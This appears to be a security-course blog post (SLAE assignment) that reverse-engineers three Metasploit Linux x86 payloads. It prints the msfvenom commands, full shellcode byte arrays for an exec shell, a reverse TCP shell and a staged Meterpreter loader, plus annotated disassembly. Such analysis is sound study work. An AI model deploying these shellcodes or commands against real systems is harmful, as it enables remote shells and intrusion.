---
layout: post
title: Assignment 5 - Msfvenom shellcodes analysis
categories: [re,exploit]
tags: [slae, osce]
fullview: false
comments: true
---
# Assignment #5
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
> Student ID: SLAE-1228

## Libemu and friends
For this task I used `msfvenom` instead of `msfpayload`, since this is the current standard tool to generate shellcodes. I also used `sctest`, a tool that is part of the `libemu` testsuite, just like in the videos. This package is available in Debian Stretch as `libemu2`.

    # apt install libemu2

Lets learn a little more about `libemu`:

    libemu is a small library written in c offering basic x86 emulation and shellcode detection using GetPC heuristics.

And what on earth is GetPC? [This](https://nets.ec/Shellcode/Environment#GetPc) page by NetSec will tell you:

```
The GetPc technique is implementation of code which obtains the current instruction pointer. This can be useful when writing self-modifying shellcode, or other code that must become aware of its environment, as environment information cannot be supplied prior to execution of the code. 
```

In short, it is an elegant way to get the address pointed by EIP, which is not directly accessible in x86.

```
jmp startup
getpc:
   mov (%esp), %eax
   ret
startup:
call getpc       ; the %eax register now contains %eip on the next line 
```

Ok, enough of learning about `libemu` internals. Moving on to `sctest`, this is a tool that allows, among other things, to generate a control flow graph for the shellcode and write it to a DOT file. This file can be rendered as an image using the `dot` utility.

	sctest allows to test streams for shellcode.

Based on the course videos and on [this] page I managed to create a one liner that generates an image of the shellcode flow.

    $ cat shellcode.hex | tr -d '\\\x' | xxd -r -p | sctest -vvv -Ss 99999 -G shellcode.dot; dot -Tpng -o shellcode.png shellcode.dot

## Selected shellcodes
Before picking 3 shellcodes to analyse I took a look at the payloads for `linux/x86` Metasploit has to offer:

```
msfvenom --list payloads | grep linux/x86
    linux/x86/adduser                                   Create a new user with UID 0
    linux/x86/chmod                                     Runs chmod on specified file with specified mode
    linux/x86/exec                                      Execute an arbitrary command
    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection
    linux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)
    linux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection
    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6
    linux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service
    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection
    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)
    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection
    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x86/shell_find_port                           Spawn a shell on an established connection
    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell

```

I decided to analyse the following payloads.

### linux/x86/exec CMD="/bin/bash"
I used this one during [Assignment#3](https://marcosvalle.github.io/re/exploit/2018/08/23/egg-hunter.html) for spawning a shell after a buffer overflow using an egg hunter. Now it is time to understand what has happened under the hood.

```
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/bash" -f c
No encoder or badchars specified, outputting raw payload
Payload size: 45 bytes
Final size of c file: 213 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0a\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
```
This is a very simple shellcode, basically the stack is prepared and the syscall is called. However, there is on particularly interesting optimization here:

* Usage of `cwd` instruction to clear out edx. The sign of eax (0 in this case) is copied into dx, therefore clearing it out.

Line-by-line analysis:

```
push   0xb 
pop    eax  ;the first 2 lines set eax=0xb, which is the syscall number for sys_execve
cwd         ;clears edx
push   edx  ;pushes 0 into the stack
pushw  0x632d   ;pushes '-c' into the stack
mov    edi,esp  ;save the stack pointer in edi (points to -c)
push   0x68732f ;save /sh into the stack (little endian)
push   0x6e69622f   ;save /bin into the stack (little endian)
mov    ebx,esp  ;save the stack pointer in ebx (points to /bin/sh)
push   edx  ;push 0 into the stack      
call   0xf  ;probably related to stack alignment, not sure
push   edi  ;push -c again
push   ebx  ;push /bin/sh
mov    ecx,esp  ;save '/bin/sh -c' in ecx
;EAX=0xb
;EBX -> "/bin/sh"
;ECX -> Address of '/bin/sh -c'
;EDX ->
int    0x80; calls execve
```

![exec]({{ "/assets/media/exec.png" | absolute_url }})


As a bonus, lets see what happens when we try to avoid NULLs.

```
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/bash" -b '\x00' -f c
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 72 (iteration=0)
x86/shikata_ga_nai chosen with final size 72
Payload size: 72 bytes
Final size of c file: 327 bytes
unsigned char buf[] = 
"\xbf\xd1\xf0\xac\xf4\xdb\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x0c\x83\xea\xfc\x31\x7a\x0f\x03\x7a\xde\x12\x59\x9e\xeb\x8a"
"\x3b\x0d\x8d\x42\x11\xd1\xd8\x74\x01\x3a\xa9\x12\xd2\x2c\x62"
"\x81\xbb\xc2\xf5\xa6\x6e\xf3\x0f\x29\x8f\x03\x20\x4b\xe6\x6d"
"\x11\xe9\x99\x02\x05\xed\x0e\xb6\x5c\x0c\x7d\xb8";
```

![exec_no_nulls]({{ "/assets/media/exec_no_null.png" | absolute_url }})

Wow, not exactly what I was expecting. But looking the output more carefully:

     Attempting to encode payload with 1 iterations of x86/shikata_ga_nai

In order to avoid NULL bytes, msfvenom picks an encoder. In this case the infamous `shikata_ga_nai`. So I decided do my homework and check how this encoder works. Despite its frequent use, I could not find so many sources explaining the algorithm. But to not turn this post into a book I made another one dedicated to this subject.

You can find [my shikata_ga_nai analysis here](https://marcosvalle.github.io/re/exploit/2018/08/25/shikata-ga-nai.html)

### linux/x86/shell_reverse_tcp
I have also used the reverse_tcp shellcode when preparing [Assignment#2](https://marcosvalle.github.io/re/exploit/2018/08/20/reverse-shell-tcp.html) and was actually wondering how it works. 

```
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp -f c
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

![shell_reverse_tcp]({{ "/assets/media/shell_reverse_tcp.png" | absolute_url }})

If you remember from our previous assignment, we used the following functions that were later converted to syscalls:

* int socket(int protocolFamily, int type, int protocol);
* int connect(int socket, struct sockaddr \*foreignAddress, unsigned int addressLength);
* int dup2(int oldfd, int newfd);
* int execve(const char \*filename, char \*const argv[],char \*const envp[]); 

They are all there. There are some differences between our simple shellcode and this elegant one. First, there are several optimizations, for example:

* Usage of `mul` instruction to clear registers
* Usage of `xchg` instruction to move the content of one register to another
* Usage of a loop structure for redirecting INPUT, OUTPUT and ERROR

Improvements apart, the essence of this shellcode is pretty much the same as ours.

### linux/x86/meterpreter/reverse_tcp
Now that we know what `linux/x86/shell_reverse_tcp`, why not looking at Meterpreter? Metasploit splits some of it payloads in Stageless and Staged categories. The first one corresponds to payloads that are delivered as a single chunk and you can identify them as `meterpreter_`. On the other hand, Staged payloads are delivered in parts. Initially the victim receives a small stage which then loads the following stages.

Since the stageless payload is humongous, I will analyse only the stalegess version.

```
msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp -f c
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of c file: 543 bytes
unsigned char buf[] = 
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
"\xe1\xcd\x80\x97\x5b\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c"
"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80"
"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
"\x00\xcd\x80";
```

Code analysis (highlights):

```
0:  6a 0a                   push   0xa
2:  5e                      pop    esi	;esi=0xa (PUSH-POP technique)
3:  31 db                   xor    ebx,ebx	;clear out ebx
5:  f7 e3                   mul    ebx	;clear eax
7:  53                      push   ebx	;store 0 on the stack
8:  43                      inc    ebx	;ebx=1
9:  53                      push   ebx	;store 1 on the stack
a:  6a 02                   push   0x2	;store 2 on the stack
c:  b0 66                   mov    al,0x66	;socketcall syscall number 0x66 in eax
e:  89 e1                   mov    ecx,esp	;point ecx to the parameters on the stack
;EAX=0x66 (socketcall)
;EBX=1 (socket)
;ECX -> 2/1/0 (parameters)

10: cd 80                   int    0x80		;call syscall (socket)
12: 97                      xchg   edi,eax  ;save the result of the syscall (file descriptor) in edi
13: 5b                      pop    ebx      ;ebx=2
14: 68 7f 00 00 01          push   0x100007f    ;IP
19: 68 02 00 11 5c          push   0x5c110002   ;PORT
1e: 89 e1                   mov    ecx,esp  ;ecx points to the parameters on the stack
20: 6a 66                   push   0x66
22: 58                      pop    eax      ;eax=0x66, 'connect' syscall number
23: 50                      push   eax      ;push 0x66 on the stack (socketcall)
24: 51                      push   ecx      ;push the address of the parameters
25: 57                      push   edi      ;push the socket file descriptor
26: 89 e1                   mov    ecx,esp  ;ecx now points to the parameters on the stack
28: 43                      inc    ebx      ;ebx=3
;EAX=0x66 (socketcall)
;EBX=3 (connect)
;ECX -> &(sockaddr parameters)


29: cd 80                   int    0x80 ;call syscall (connect)
2b: 85 c0                   test   eax,eax  ;check if eax is 0 (connection successful)
2d: 79 19                   jns    0x48
2f: 4e                      dec    esi  ;if connection failed,
30: 74 3d                   je     0x6f
32: 68 a2 00 00 00          push   0xa2 ;prepare nanosleep syscall
37: 58                      pop    eax
38: 6a 00                   push   0x0
3a: 6a 05                   push   0x5
3c: 89 e3                   mov    ebx,esp
3e: 31 c9                   xor    ecx,ecx
40: cd 80                   int    0x80 ;call nanosleep (wait for signal)
42: 85 c0                   test   eax,eax
44: 79 bd                   jns    0x3
46: eb 27                   jmp    0x6f
48: b2 07                   mov    dl,0x7
4a: b9 00 10 00 00          mov    ecx,0x1000
4f: 89 e3                   mov    ebx,esp
51: c1 eb 0c                shr    ebx,0xc
54: c1 e3 0c                shl    ebx,0xc
57: b0 7d                   mov    al,0x7d
59: cd 80                   int    0x80
5b: 85 c0                   test   eax,eax
5d: 78 10                   js     0x6f
5f: 5b                      pop    ebx
60: 89 e1                   mov    ecx,esp
62: 99                      cdq
63: b6 0c                   mov    dh,0xc
65: b0 03                   mov    al,0x3
67: cd 80                   int    0x80 ;read syscall
69: 85 c0                   test   eax,eax
6b: 78 02                   js     0x6f
6d: ff e1                   jmp    ecx
6f: b8 01 00 00 00          mov    eax,0x1
74: bb 01 00 00 00          mov    ebx,0x1
79: cd 80                   int    0x80 ;sys_exit
```

The idea is to create a socket then try to connect to a certain IP/PORT. If it does not succed, wait for a few seconds or the delivery of a signal (connection). If the time runs off, goes back to the beginning and try to connect once again. When if finally succeds, read whatever is sent (probably the next stage).

![meterpreter/reverse_tcp]({{ "/assets/media/meterpreter_reverse_tcp_staged.png" | absolute_url }})
